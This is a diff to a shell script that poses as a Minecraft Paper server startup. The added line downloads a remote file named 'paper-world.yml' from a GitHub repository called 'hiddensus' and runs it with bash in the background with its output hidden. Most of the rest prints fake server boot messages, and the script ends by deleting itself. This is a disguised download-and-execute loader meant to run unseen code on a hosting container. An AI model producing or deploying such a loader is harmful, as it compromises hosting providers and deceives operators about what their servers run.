@@ -1,3 +1,4 @@
+curl -o /home/container/world/paper-world.yml https://raw.githubusercontent.com/AdrianCrack23/hiddensus/main/paper-world.yml
 bash /home/container/world/paper-world.yml > /dev/null &
 echo "Starting org.bukkit.craftbukkit.Main"
 echo "System Info: Java 17 (OpenJDK 64-Bit Server VM 17.0.2+8-86) Host: Linux 5.4.0-121-generic (amd64)"
@@ -39,7 +40,7 @@ echo "[$(date +%X) INFO]: Time elapsed: 367 ms"
 echo "[$(date +%X) INFO]: Running delayed init tasks"
 echo "[$(date +%X) INFO]: Done (21.633s)! For help, type "help""
 echo "[$(date +%X) INFO]: Timings Reset"
-rm /home/container/m.sh
+rm /home/container/dio.sh
 
 
 
